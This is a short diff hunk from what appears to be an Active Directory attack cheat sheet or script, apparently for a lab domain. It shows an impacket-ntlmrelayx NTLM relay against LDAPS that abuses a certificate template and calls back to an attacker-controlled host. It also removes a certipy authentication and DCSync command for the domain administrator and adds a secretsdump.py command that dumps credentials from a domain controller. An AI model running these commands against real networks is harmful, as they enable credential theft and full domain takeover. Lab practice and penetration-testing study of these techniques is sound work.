@@ -69,8 +69,8 @@ impacket-ntlmrelayx -t ldaps://DC.domain.local --adcs-device-interface \
   http://$ATTACKER_IP:9061 --template VulnerableCert -smb2support --quiet &
 
 # 5. Auth və DCSync
-certipy auth -pfx ./certs/abused_cert.pfx -username machine$ -domain domain.local \
-  -dc-ip DC_IP -dcsync domain.local/administrator
+secretsdump.py -k -no-pass inlanefreight.local/<USER>@10.129.234.174
+
 
 OneLine:
 #!/bin/bash
